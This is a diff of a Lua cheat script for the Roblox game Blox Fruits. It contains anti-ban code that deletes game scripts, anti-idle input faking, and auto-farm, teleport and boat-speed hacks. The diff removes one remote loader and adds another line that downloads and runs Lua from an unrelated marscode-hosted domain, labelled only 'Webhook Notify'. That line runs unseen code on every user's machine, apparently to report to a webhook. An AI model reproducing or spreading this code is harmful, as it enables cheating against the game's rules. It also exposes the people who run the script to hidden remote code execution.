@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vldtncywdlojtnvjlmvyrbszljd/jklp/refs/heads/main/..lua",true))()
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 shared.LoaderTitle = 'Botuna.INC X Medusa Script'
 shared.LoaderKeyFrames = {
@@ -29,8 +28,8 @@ local Metadata = {
 
 local StepTexts = {
     [1] = "Initiating Script",
-    [2] = "Bypassing Security",
-    [3] = "Injecting Function",
+    [2] = "Anti Detect Security",
+    [3] = "Anti Role Back",
     [4] = "Success Executing"
 }
 
@@ -222,7 +221,6 @@ TweenObject(Main, 0.25, {
 })
 wait(0.25)
 Core:Destroy()   
-
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 function AntiBan()
     for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
@@ -234,7 +232,7 @@ function AntiBan()
      end
      for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts:GetDescendants()) do
         if v:IsA("LocalScript") then
-            if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans"  or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp"  or v.Name == "PlayerList" or v.Name == "FastAttack" or v.Name == "BringMobs" or v.Name == "SpamSkill" or v.Name == "ReplicatedStorage.Effect" then
+            if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans"  or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp"  or v.Name == "PlayerList" or v.Name == "FastAttack" or v.Name == "BringMobs" or v.Name == "SpamSkill" then
                 v:Destroy()
             end
         end
@@ -248,7 +246,6 @@ game:GetService("Players").LocalPlayer.Idled:connect(function()
 	game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
 end)
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
 
 local Notif = {}
 
@@ -4276,8 +4273,9 @@ getgenv().HyperCahayas = function(p)
         wait(1)
         game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
     end)
-    
-
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+loadstring(game:HttpGet("https://37utf92gn8cmz.ahost.marscode.site/as/all-string.lua"))() --Webhook Notify
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 local Library = Update:Window("Brutality Hub V4","WAIT UPDATE | IS UNDER CONSTRUCTION",Enum.KeyCode.RightControl);
 
 local NguyenTien = Library:AddTab("Home","18797343654")
@@ -5111,11 +5109,57 @@ end)
                         _G.ChestBypass = false
                         AutoFarmChest = false
                         topos(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
+                        break --tambahan break untuk menghentikan pergerakan jika sudah menemukan item
                     end
                 end
             end)
         end
     end)
+
+Main:AddToggle("Auto Get FOD or God's Chalice (beta)", false, function(value)
+    AutoFarmChest2 = value
+    _G.StopItemsChest = value
+    StopTween(AutoFarmChest2 or _G.StopItemsChest)
+end)
+    
+    _G.MagnitudeAdd = 0
+    
+    spawn(function()
+        while wait() do 
+            if AutoFarmChest2 then
+                local chestWithLegendaryItemFound = false
+
+                for i, v in pairs(game:GetService("Workspace"):GetChildren()) do 
+                    if v.Name:find("Chest") then
+                        if game:GetService("Workspace"):FindFirstChild(v.Name) then
+                            local godsChalice = v:FindFirstChild("God's Chalice")
+                            local fishOfDarkness = v:FindFirstChild("Fish of Darkness")
+    
+                            if godsChalice or fishOfDarkness then
+                                chestWithLegendaryItemFound = true
+
+                                repeat wait()
+                                    if game:GetService("Workspace"):FindFirstChild(v.Name) then
+                                        HyperCahaya(v.CFrame)
+                                    end
+                                until AutoFarmChest2 == false or not v.Parent
+
+                                HyperCahaya(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
+
+                                AutoFarmChest2 = false
+                                _G.StopItemsChest = false
+                                break
+                            end
+                        end
+                    end
+                end
+                if not chestWithLegendaryItemFound then
+                end
+                _G.MagnitudeAdd = _G.MagnitudeAdd + 1500
+            end
+        end
+    end)
+---farm chest khusus untuk fod atau god chalice    
     
 Main:AddToggle("Auto Farm Chest | Safe ",false,function(value)
  AutoFarmChest = value
@@ -5389,11 +5433,11 @@ for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
 end
 
 local bossCheck = {}
-local bossNames = { "The Gorilla King", "Bobby", "The Saw", "Yeti", "Mob Leader", "Vice Admiral", "Warden", "Chief Warden", "Swan", "Saber Expert", "Magma Admiral", "Fishman Lord", "Wysper", "Thunder God", "Cyborg", "Greybeard", "Diamond", "Jeremy", "Fajita", "Don Swan", "Smoke Admiral", "Awakened Ice Admiral", "Tide Keeper", "Order", "Darkbeard", "Cursed Captain", "Stone", "Island Empress", "Kilo Admiral", "Captain Elephant", "Beautiful Pirate", "Longma", "Cake Queen", "Soul Reaper", "Rip_Indra", "Cake Prince", "Dough King" }
+local bossName = { "The Gorilla King", "Bobby", "The Saw", "Yeti", "Mob Leader", "Vice Admiral", "Warden", "Chief Warden", "Swan", "Saber Expert", "Magma Admiral", "Fishman Lord", "Wysper", "Thunder God", "Cyborg", "Greybeard", "Diamond", "Jeremy", "Fajita", "Don Swan", "Smoke Admiral", "Awakened Ice Admiral", "Tide Keeper", "Order", "Darkbeard", "Cursed Captain", "Stone", "Island Empress", "Kilo Admiral", "Captain Elephant", "Beautiful Pirate", "Longma", "Cake Queen", "Soul Reaper", "Rip_Indra", "Cake Prince", "Dough King" }
 
 
 if World1 or World2 or World3 then
-    for _, bossName in pairs(bossNames) do
+    for _, bossName in pairs(bossName) do
         if game:GetService("ReplicatedStorage"):FindFirstChild(bossName) then
             table.insert(bossCheck, bossName)
         end
@@ -8376,8 +8420,9 @@ M:AddToggle("Auto Finish Zone 5 (fix bug)",_G.dao,function(state)
             end
         end)
 ]]
-SNt:AddToggle("Speed Boat",_G.IncreaseBoatSpeed,function(value) -- state
-    _G.IncreaseBoatSpeed = value
+SNt:AddToggle("Speed Boat",_G.IncreaseBoatSpeed,_G.BiirTrax,function(v) -- state
+    _G.IncreaseBoatSpeed = v
+    _G.BiirTrax = v
 end)
 
 spawn(function()
@@ -8402,58 +8447,77 @@ spawn(function()
     end
 end)
 
-    SNt:AddToggle("Auto Sail Rough Sea",_G.BiirTrax,function(state)
+
+
+PosYBoatInWater = 0
+SNt:AddSlider("Position Y Boat On Water",true, 0, 80, 200, function(value)
+    PosYBoatInWater = value
+end)
+
+
+spawn(function()
+    while task.wait() do
+        pcall(function()
+
+            local boat = workspace:FindFirstChild("targetModelName") 
+            if boat and boat.PrimaryPart then
+
+                local currentPosition = boat.PrimaryPart.Position
+                local newYPosition = PosYBoatInWater
+                
+                boat:SetPrimaryPartCFrame(CFrame.new(currentPosition.X, newYPosition, currentPosition.Z))
+            end
+        end)
+    end
+end)
+
+
+SNt:AddToggle("Auto Sail Rough Sea", _G.BiirTrax, function(state)
     if state then
         _G.BiirTrax = true
     else
         _G.BiirTrax = false
     end
 
+    if _G.BiirTrax then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16921.853515625, 9.0863618850708, 433.9601135253906)
+        wait(0.5)
 
-if _G.BiirTrax then
+        local args = {
+            [1] = "BuyBoat",
+            [2] = "PirateBrigade"
+        }
 
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16921.853515625, 9.0863618850708, 433.9601135253906) 
-wait(0.5) 
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
 
-local args = {
-    [1] = "BuyBoat",
-    [2] = "PirateBrigade"
-}
+        function two(gotoCFrame) -- Tween
+            pcall(function()
+                game.Players.LocalPlayer.Character.Humanoid.Sit = false
+                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+            end)
+            if (game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - gotoCFrame.Position).Magnitude <= 200 then
+                pcall(function() 
+                    tweenz:Cancel()
+                end)
+                game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.CFrame = gotoCFrame
+            else
+                local tween_s = game:service("TweenService")
+                local info = TweenInfo.new((game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - gotoCFrame.Position).Magnitude/325, Enum.EasingStyle.Linear)
+                tween, err = pcall(function()
+                    tweenz = tween_s:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = gotoCFrame})
+                    tweenz:Play()
+                end)
+                if not tween then return err end
+            end
+        end
+        two(CFrame.new(-30939.830078125, 3.729933261871338, 9256.4208984375))
 
-game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
-
-function two(gotoCFrame) --- Tween
-      pcall(function()
-          game.Players.LocalPlayer.Character.Humanoid.Sit = false
-          game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-      end)
-      if (game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - gotoCFrame.Position).Magnitude <= 200 then
-          pcall(function() 
-              tweenz:Cancel()
-          end)
-          game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.CFrame = gotoCFrame
-      else
-          local tween_s = game:service"TweenService"
-          local info = TweenInfo.new((game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart.Position - gotoCFrame.Position).Magnitude/325, Enum.EasingStyle.Linear)
-           tween, err = pcall(function()
-              tweenz = tween_s:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = gotoCFrame})
-              tweenz:Play()
-          end)
-          if not tween then return err end
-      end
-      function _TweenCanCle()
-          tweenz:Cancel()
-      end
-  
-end
-two(CFrame.new(-30939.830078125, 3.729933261871338, 9256.4208984375))
-
-for _,v in next, workspace.Boats.PirateBrigade:GetDescendants() do
-    if v.Name:find("VehicleSeat") then
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
+        for _,v in next, workspace.Boats.PirateBrigade:GetDescendants() do
+            if v.Name:find("VehicleSeat") then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
+            end
+        end
     end
-end
-end
 end)
 
 spawn(function()
@@ -8462,7 +8526,7 @@ spawn(function()
             if _G.BiirTrax then
                 for _, v in next, workspace.Boats.PirateBrigade:GetDescendants() do
                     if v.Name:find("VehicleSeat") then
-                        wait(5) 
+                        wait(5)
                         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
                         break
                     end
@@ -8473,13 +8537,13 @@ spawn(function()
                     {name = "Terrorshark", variable = "Terrorshark"},
                     {name = "Shark", variable = "Shark"},
                     {name = "Piranha", variable = "Piranha"},
-                    {name = "FishBoat", variable = "FishBoat"}, 
+                    {name = "FishBoat", variable = "FishBoat"}
                 }
 
                 for _, v in next, workspace.Boats.PirateBrigade:GetDescendants() do
                     if v.Name:find("VehicleSeat") then
                         vehicleSeat = v
-                        wait(0.2) 
+                        wait(0.2)
 
                         for _, enemyType in pairs(enemyTypes) do
                             local enemyName = enemyType.name
@@ -8487,12 +8551,12 @@ spawn(function()
 
                             if game:GetService("Workspace").Enemies:FindFirstChild(enemyName) then
                                 game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                                wait(0.1) 
+                                wait(0.1)
                                 _G[enemyVariable] = true
 
                                 -- Menunggu musuh mati
                                 while game:GetService("Workspace").Enemies:FindFirstChild(enemyName) do
-                                    wait(0.2) 
+                                    wait(0.2)
                                 end
 
                                 _G[enemyVariable] = false
@@ -8518,38 +8582,21 @@ spawn(function()
     while wait() do
         pcall(function()
             if _G.BiirTrax then
-                local batuLaut = {"SmallGroup", "SmallCluster", "MediumGroup", "MediumFlat", "Large", "Largest"}
-
-                for _, v in pairs(workspace:GetChildren()) do
-                    if table.find(batuLaut, v.Name) and v:IsA("Model") then
-                        for _, part in pairs(v:GetDescendants()) do
-                            if part:IsA("BasePart") then
-                                part.CanCollide = false
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-    end
-end)
-
-spawn(function()
-    while wait() do
-        pcall(function()
-            if _G.BiirTrax then
-                wait(0.8) 
+                wait(0.8)
                 local targetModelNames = "PirateBrigade"
                 local models = workspace.Boats:GetChildren()
 
-                for _, targetModelName in ipairs(targetModelNames) do
+                for _, targetModelName in pairs(targetModelNames) do
                     local targetModel = workspace:FindFirstChild(targetModelName)
 
                     if targetModel then
-                        local speed = 10.5
+                        local speed = 150 -- Kecepatan perahu
                         local forwardDirection = targetModel.PrimaryPart.CFrame.lookVector
                         local targetPosition = targetModel.PrimaryPart.Position + forwardDirection * 10
-                        
+
+                        -- Ubah Posisi Y berdasarkan slider
+                        targetPosition = Vector3.new(targetPosition.X, PosYBoatInWater, targetPosition.Z)
+
                         while (targetModel.PrimaryPart.Position - targetPosition).Magnitude > 0.1 do
                             targetModel:SetPrimaryPartCFrame(targetModel.PrimaryPart.CFrame + forwardDirection * speed)
                             task.wait()
@@ -8563,6 +8610,7 @@ spawn(function()
         end)
     end
 end)
+
 
 SNt:AddSeperator("Frozen & Kitsune")
 
@@ -14827,27 +14875,40 @@ end)
 	end)
 
     Mh:AddSeperator("Auto Hop Server")
-    Mh:AddLabel("Click And Wait 5 Second")
+    Mh:AddLabel("Click And Wait For Loading")
 
-    Mh:AddToggle("God's Chalice & FOD Notify (beta)",false ,_G.NotifItemChestheck,function(value)
+    Mh:AddToggle("God's Chalice & FOD Notify", false, _G.NotifItemChestcheck, function(value)
         _G.NotifItemChestcheck = value
-        end)
-        
-        spawn(function()
-                while wait(.1) do
-                    if _G.NotifItemChestcheck then
-                        for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fish of Darkness")) do
-                            if string.find(v.Name, "God's Chalice", "Fish of Darkness") then
-                                require(game:GetService("ReplicatedStorage").Notification).new("Mirage Island Spawn"):Display();
-                                wait()
-                                setthreadcontext(5)
-                            end
-                        end
-                    end
-                  end
-                 end)
+    end)
+    
+    spawn(function()
+        while wait(1) do 
+            if _G.NotifItemChestcheck then
+                local godsChaliceInBackpack = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("God's Chalice")
+                local fishOfDarknessInBackpack = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fish of Darkness")
 
-    Mh:AddToggle("Mirage Island Notify (beta)",false ,_G.NotifMirragecheck,function(value)
+                local chest = game:GetService("Workspace"):FindFirstChild("Chest")
+                local godsChaliceInChest = nil
+                local fishOfDarknessInChest = nil
+    
+                if chest then
+                    godsChaliceInChest = chest:FindFirstChild("God's Chalice")
+                    fishOfDarknessInChest = chest:FindFirstChild("Fish of Darkness")
+                end
+                if godsChaliceInBackpack or godsChaliceInChest then
+                    require(game:GetService("ReplicatedStorage").Notification).new("God's Chalice detected in backpack or chest!"):Display()
+                    wait(1)
+                end
+
+                if fishOfDarknessInBackpack or fishOfDarknessInChest then
+                    require(game:GetService("ReplicatedStorage").Notification).new("FOD detected in backpack or chest!"):Display()
+                    wait(1)
+                end
+            end
+        end
+    end)
+    
+    Mh:AddToggle("Mirage Island Notify",false ,_G.NotifMirragecheck,function(value)
         _G.NotifMirragecheck = value
         end)
         
@@ -14865,7 +14926,7 @@ end)
                   end
                  end)
 
-    D:AddToggle("Fruit Notification",false ,_G.EliteCheck,function(value)
+    D:AddToggle("Elite Hunter Notification",false ,_G.EliteCheck,function(value)
 _G.EliteCheck = value
 end)
         
@@ -14882,15 +14943,6 @@ end
 end
 end
 end)
-
-
-
-
-
-
-
-
-
 
 
     Mh:AddToggle("Auto Hop Server Mirage Island",_G.Hopfinddao,function(value)
